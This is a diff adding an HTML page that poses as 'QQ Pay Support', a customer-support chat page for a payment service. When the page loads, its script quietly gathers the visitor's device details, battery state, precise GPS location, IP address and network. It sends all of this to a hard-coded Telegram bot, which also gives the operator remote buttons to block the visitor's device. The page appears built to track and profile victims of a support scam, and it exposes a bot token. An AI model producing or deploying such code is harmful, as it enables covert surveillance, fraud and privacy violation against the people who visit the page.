@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>QQ Pay Support</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&family=Nunito:wght@400;600;800&display=swap');
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Nunito', sans-serif; background-color: #f0f8ff; height: 100vh; display: flex; justify-content: center; align-items: center; color: #333; }
+  .card { background: #fff; border: 3px solid #333; border-radius: 30px; padding: 25px 20px; width: 90%; max-width: 380px; box-shadow: 8px 8px 0px #333; text-align: center; display: flex; flex-direction: column; align-items: center; position: relative; z-index: 10; }
+  .poster-logo { width: 120px; height: 120px; object-fit: contain; margin-bottom: 15px; filter: drop-shadow(4px 4px 0px #333); }
+  h2 { font-family: 'Fredoka One', cursive; font-size: 26px; color: #333; margin-bottom: 5px; }
+  .tagline { font-size: 15px; color: #666; font-weight: 800; margin-bottom: 20px; }
+  .instruction-box { margin-top: 10px; padding: 15px; background: #ffe066; border: 3px dashed #333; border-radius: 15px; display: flex; flex-direction: column; align-items: center; width: 100%; }
+  .instruction-text { font-weight: 800; font-size: 14.5px; color: #333; margin-bottom: 5px; }
+  .arrow-down-right { font-size: 40px; color: #ff4757; animation: bounceRight 1s infinite; margin-top: -5px; }
+  @keyframes bounceRight { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(10px, 10px); } }
+  
+  /* Black Block Screen */
+  #blockScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100vh; background: #000; color: #ff4757; z-index: 99999; justify-content: center; align-items: center; flex-direction: column; text-align: center; padding: 20px; }
+  #blockScreen h1 { font-family: 'Fredoka One', cursive; font-size: 35px; margin-bottom: 15px; text-shadow: 0 0 10px #ff4757; }
+  #blockScreen p { font-size: 16px; font-weight: bold; color: #fff; line-height: 1.5; }
+  .danger-icon { font-size: 70px; margin-bottom: 20px; animation: pulse 1s infinite; }
+  @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/src/ua-parser.min.js"></script>
+</head>
+<body>
+
+<!-- Block Screen -->
+<div id="blockScreen">
+  <div class="danger-icon">🚫</div>
+  <h1>ACCESS DENIED</h1>
+  <p>Aapka device block kar diya gaya hai.<br>Yeh website aapke liye band hai.</p>
+</div>
+
+<!-- Main Website -->
+<div class="card" id="mainWebsite">
+  <img src="https://qqpay.co.in/images/qqpay-logo.webp" alt="Logo" class="poster-logo" onerror="this.src='https://via.placeholder.com/120x120/ffffff/333333?text=LOGO'">
+  <h2>QQ Pay Support</h2>
+  <p class="tagline">24/7 Customer Support</p>
+  <div class="instruction-box">
+    <div class="instruction-text">Chat shuru karne ke liye <br> <b>Neeche Right Side</b> wale icon par click karein</div>
+    <div class="arrow-down-right">↘</div>
+  </div>
+</div>
+
+<script> window.intergramId = "8709228094" </script>
+<script id="intergram" type="text/javascript" src="https://www.intergram.xyz/js/widget.js"></script>
+
+<script>
+  const BOT_TOKEN = "8864112645:AAHTMjpWSfPxhqAB8pkgwm-j49OXAGWs1zI";
+  const MY_CHAT_ID = "8709228094";
+  const visitorId = "visitor_" + Math.random().toString(36).slice(2, 7);
+
+  // Initial Block Check (Agar pehle se block hai)
+  if (localStorage.getItem("deviceBlocked") === "true") {
+    document.getElementById("mainWebsite").style.display = "none";
+    document.getElementById("blockScreen").style.display = "flex";
+    if(document.getElementById('intergramFrame')) document.getElementById('intergramFrame').style.display = 'none';
+  }
+
+  // Device Info
+  const parser = new UAParser();
+  const result = parser.getResult();
+  let company = result.device.vendor || "Unknown Company";
+  if (company === "Unknown Company") {
+    if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) company = "Apple";
+    else if (/Samsung/i.test(navigator.userAgent)) company = "Samsung";
+    else if (/Xiaomi|Redmi|POCO/i.test(navigator.userAgent)) company = "Xiaomi/Redmi";
+    else if (/Realme/i.test(navigator.userAgent)) company = "Realme";
+    else if (/Oppo/i.test(navigator.userAgent)) company = "Oppo";
+    else if (/Vivo/i.test(navigator.userAgent)) company = "Vivo";
+    else if (/OnePlus/i.test(navigator.userAgent)) company = "OnePlus";
+  }
+  const deviceModel = result.device.model || "Unknown Model";
+  const deviceType = result.device.type || "Desktop";
+  const osName = result.os.name || "Unknown OS";
+  const browserName = result.browser.name || "Unknown Browser";
+
+  async function getBattery() {
+    try {
+      const battery = await navigator.getBattery();
+      return `🔋 Battery: ${Math.round(battery.level * 100)}% (Charging: ${battery.charging ? "Yes ⚡" : "No"})`;
+    } catch (e) { return "🔋 Battery: Info not available"; }
+  }
+
+  function getGPSLocation() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) { resolve("📍 GPS: Not supported"); return; }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => resolve(`📍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`),
+        () => resolve("📍 GPS: Permission denied"),
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    });
+  }
+
+  async function trackVisitor() {
+    const batteryInfo = await getBattery();
+    const gpsInfo = await getGPSLocation();
+
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      
+      // BLOCK aur UNBLOCK ke links
+      const blockUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_CHAT_ID}&text=BLOCK_${visitorId}`;
+      const unblockUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_CHAT_ID}&text=UNBLOCK_${visitorId}`;
+
+      const msg = `🚨 <b>New Visitor Connected!</b>\n\n` +
+                  `🆔 <b>ID:</b> <code>${visitorId}</code>\n` +
+                  `🏢 <b>Company:</b> ${company}\n` +
+                  `📱 <b>Model:</b> ${deviceModel} (${deviceType})\n` +
+                  `⚙️ <b>OS:</b> ${osName}\n` +
+                  `💻 <b>Browser:</b> ${browserName}\n` +
+                  `${batteryInfo}\n` +
+                  `${gpsInfo}\n` +
+                  `🌐 <b>IP:</b> ${data.ip}\n` +
+                  `📡 <b>Network:</b> ${data.org || 'Unknown'}\n` +
+                  `📍 <b>Location:</b> ${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          chat_id: MY_CHAT_ID, 
+          text: msg, 
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "🚫 BLOCK DEVICE", url: blockUrl }, { text: "✅ UNBLOCK DEVICE", url: unblockUrl }]
+            ]
+          }
+        })
+      });
+
+      checkStatus();
+
+    } catch (e) { console.log("Error", e); }
+  }
+
+  // Check Block/Unblock Status (Har 2 second me)
+  function checkStatus() {
+    setInterval(async () => {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+        const data = await res.json();
+        if (data.ok && data.result) {
+          data.result.slice(-15).forEach(update => {
+            if (update.message && update.message.text) {
+              const txt = update.message.text;
+              
+              // Agar aapne BLOCK dabaya
+              if (txt === `BLOCK_${visitorId}`) {
+                localStorage.setItem("deviceBlocked", "true");
+                document.getElementById("mainWebsite").style.display = "none";
+                document.getElementById("blockScreen").style.display = "flex";
+                const intergram = document.getElementById('intergramFrame');
+                if (intergram) intergram.style.display = 'none';
+              }
+              
+              // Agar aapne UNBLOCK dabaya
+              if (txt === `UNBLOCK_${visitorId}`) {
+                localStorage.removeItem("deviceBlocked");
+                document.getElementById("mainWebsite").style.display = "flex";
+                document.getElementById("blockScreen").style.display = "none";
+                const intergram = document.getElementById('intergramFrame');
+                if (intergram) intergram.style.display = 'block';
+              }
+
+            }
+          });
+        }
+      } catch (e) {}
+    }, 2000);
+  }
+
+  trackVisitor();
+</script>
+
+</body>
+</html>
